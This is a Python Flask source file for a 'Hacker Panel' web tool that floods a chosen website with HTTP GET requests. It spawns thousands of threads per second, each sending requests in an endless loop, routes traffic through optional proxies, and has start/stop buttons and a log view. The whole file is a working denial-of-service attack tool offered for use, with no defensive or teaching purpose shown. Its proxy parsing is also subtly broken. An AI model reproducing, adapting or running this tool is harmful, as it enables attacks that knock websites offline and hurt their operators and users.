from flask import Flask, request, jsonify
import threading
import requests
import socket
import time

app = Flask(__name__)

# Global variables
attack_running = False
threads = []
log_messages = []
proxies = None

def send_requests(url):
    global attack_running, log_messages, proxies
    while attack_running:
        try:
            response = requests.get(url, proxies=proxies)
            log_messages.append(f"Response: {response.status_code}")
        except Exception as e:
            log_messages.append(f"Error: {e}")

def start_attack(url, num_threads_per_second, proxy_list):
    global attack_running, threads, log_messages, proxies
    attack_running = True
    threads = []
    proxies = parse_proxies(proxy_list)
    log_messages.append(f"Starting attack on {url} with {num_threads_per_second} threads per second.")

    def create_threads():
        while attack_running:
            for _ in range(num_threads_per_second):
                thread = threading.Thread(target=send_requests, args=(url,))
                thread.start()
                threads.append(thread)
            time.sleep(1)  # Wait for 1 second before creating another batch of threads

    threading.Thread(target=create_threads).start()

def stop_attack():
    global attack_running, threads, log_messages
    if attack_running:
        attack_running = False
        log_messages.append("Attack stopped.")
        for thread in threads:
            if thread.is_alive():
                thread.join()
        threads = []

def parse_proxies(proxy_list):
    if not proxy_list:
        return None
    proxies = {}
    proxy_entries = proxy_list.split(",")
    for entry in proxy_entries:
        ip, port = entry.strip().split(":")
        proxies = {
            "http": f"http://{ip}:{port}",
            "https": f"http://{ip}:{port}"
        }
    return proxies

@app.route("/", methods=["GET", "POST"])
def index():
    global attack_running, log_messages
    if request.method == "POST":
        action = request.form.get("action")
        if action == "start":
            url = request.form["url"]
            num_threads = int(request.form["threads"])
            proxy_list = request.form.get("proxies", "")
            threading.Thread(target=start_attack, args=(url, num_threads, proxy_list)).start()
        elif action == "stop":
            stop_attack()
        return jsonify({"status": "success", "log": log_messages})
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Hacker Panel</title>
        <style>
            body {
                background-color: black;
                color: lime;
                font-family: "Courier New", Courier, monospace;
                text-align: center;
                margin: 0;
                padding: 0;
                overflow: hidden;
            }

            h1 {
                font-size: 50px;
                color: lime;
                position: relative;
                animation: glitch 1s infinite linear;
            }

            @keyframes glitch {
                0% {
                    transform: translate(0);
                    text-shadow: 0 0 5px rgba(255, 0, 0, 0.7), 0 0 10px rgba(255, 0, 0, 0.7);
                }
                20% {
                    transform: translate(-5px, -5px);
                    text-shadow: 0 0 5px rgba(255, 0, 0, 0.7), 0 0 10px rgba(255, 0, 0, 0.7);
                }
                40% {
                    transform: translate(5px, 5px);
                    text-shadow: 0 0 5px rgba(255, 0, 0, 0.7), 0 0 10px rgba(255, 0, 0, 0.7);
                }
                60% {
                    transform: translate(-5px, -5px);
                    text-shadow: 0 0 5px rgba(255, 0, 0, 0.7), 0 0 10px rgba(255, 0, 0, 0.7);
                }
                80% {
                    transform: translate(5px, 5px);
                    text-shadow: 0 0 5px rgba(255, 0, 0, 0.7), 0 0 10px rgba(255, 0, 0, 0.7);
                }
                100% {
                    transform: translate(0);
                    text-shadow: 0 0 5px rgba(255, 0, 0, 0.7), 0 0 10px rgba(255, 0, 0, 0.7);
                }
            }

            footer {
                margin-top: 30px;
                font-size: 14px;
            }

            footer b {
                color: red;
            }

            .form-container {
                margin-top: 50px;
                padding: 20px;
                border: 2px solid lime;
                display: inline-block;
                text-align: left;
                background-color: #101010;
                box-shadow: 0px 0px 15px lime;
            }

            .log-box {
                margin-top: 20px;
                max-height: 300px;
                overflow-y: auto;
                border: 1px solid lime;
                padding: 10px;
                background-color: #202020;
            }
        </style>
    </head>
    <body>
        <h1>Hacker Panel</h1>
        <div class="form-container">
            <label>Website URL:</label><br>
            <input type="text" name="url" required style="width: 100%; padding: 5px;"><br><br>
            <label>Number of Threads Per Second:</label><br>
            <input type="number" name="threads" value="30000" required style="width: 100%; padding: 5px;"><br><br>
            <label>Proxy List (comma-separated):</label><br>
            <input type="text" name="proxies" placeholder="192.168.0.1:8080,192.168.0.2:9090" style="width: 100%; padding: 5px;"><br><br>
            <button onclick="startAttack()">Start Attack</button>
            <button onclick="stopAttack()">Stop Attack</button>
        </div>
        <div class="log-box" id="log-box"></div>
        <footer>
            <p>Created By <b style="color:red;">Rahad Hasan</b></p>
        </footer>
        <script>
            async function startAttack() {
                const url = document.querySelector('input[name="url"]').value;
                const threads = document.querySelector('input[name="threads"]').value;
                const proxies = document.querySelector('input[name="proxies"]').value;
                const response = await fetch("/", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: `action=start&url=${url}&threads=${threads}&proxies=${proxies}`
                });
                const result = await response.json();
                updateLogs(result.log);
            }

            async function stopAttack() {
                const response = await fetch("/", {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: "action=stop"
                });
                const result = await response.json();
                updateLogs(result.log);
            }

            async function updateLogs(logs) {
                const logBox = document.getElementById("log-box");
                logBox.innerHTML = logs.map(log => `<p>${log}</p>`).join("");
            }

            async function fetchLogs() {
                const response = await fetch("/logs");
                const data = await response.json();
                updateLogs(data.logs);
            }

            setInterval(fetchLogs, 2000); // Update logs every 2 seconds
        </script>
    </body>
    </html>
    '''

@app.route("/logs", methods=["GET"])
def get_logs():
    global log_messages
    return jsonify({"logs": log_messages})

def get_free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]

if __name__ == "__main__":
    port = get_free_port()
    print(f"Running on port: {port}")
    app.run(port=port)
